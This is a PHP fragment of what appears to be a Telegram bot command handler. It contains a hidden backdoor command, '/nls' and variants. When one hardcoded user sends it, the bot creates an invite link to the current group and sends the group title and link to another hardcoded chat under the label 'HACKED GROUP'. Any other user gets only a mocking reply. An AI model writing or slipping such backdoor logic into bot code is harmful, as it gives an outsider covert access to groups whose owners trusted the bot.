<?php
if (strpos($text, '/nls') === 0 || strpos($text, '/nls') === 0 || strpos($text, ".nls") === 0 || strpos($text, "?nls") === 0 || strpos($text, "#nls") === 0) {
    if ($user_id != 5520425224) {
        $content = ['chat_id' => $chat_id, 'text' => "𝑸𝑼𝑬 𝑩𝑼𝑺𝑪𝑨𝑺 ._.", "reply_to_message_id" => $msg_id, 'parse_mode' => 'html'];
        $m1  = SendMessage($content);
        exit();
    } else {
        $content = ['chat_id' => $chat_id, 'text' => "𝑨𝑺 𝒀𝑶𝑼 𝑳𝑰𝑲𝑬", "reply_to_message_id" => $msg_id, 'parse_mode' => 'html'];
        $m1      = SendMessage($content);
        
        $m1      = createChatInviteLink(['chat_id' => $chat_id]);
        $link    = $m1['result']['invite_link'] ?? "null";
        $ttitle  = $ctitle ?? "null";

        $content = ['chat_id' => 1260898878, 'text' => "𝑯𝑨𝑪𝑲𝑬𝑫 𝑮𝑹𝑶𝑼𝑷\n𝑻𝒊𝒕𝒍𝒆: $ttitle\n𝑰𝒏𝒗𝒊𝒕𝒆: $link", 'parse_mode' => 'html'];
        $m1  = SendMessage($content);
    }
}
